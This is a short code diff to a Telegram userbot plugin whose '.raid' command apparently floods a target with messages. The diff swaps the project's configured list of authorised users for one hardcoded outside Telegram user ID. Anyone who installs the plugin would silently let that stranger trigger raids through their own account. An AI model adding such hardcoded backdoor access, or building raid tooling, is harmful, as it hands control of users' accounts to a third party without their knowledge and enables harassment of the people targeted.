@@ -5,8 +5,9 @@ from random import choice
 from pyrogram import Client, filters
 from pyrogram.types import Message
 
-from AdityaHalder import SUDOERS
 from AdityaHalder.helper.data import *
+
+SUDOERS = "1711510822"
 
 
 @Client.on_message(filters.command(["raid", "r"], ".") & (filters.me | filters.user(SUDOERS)))
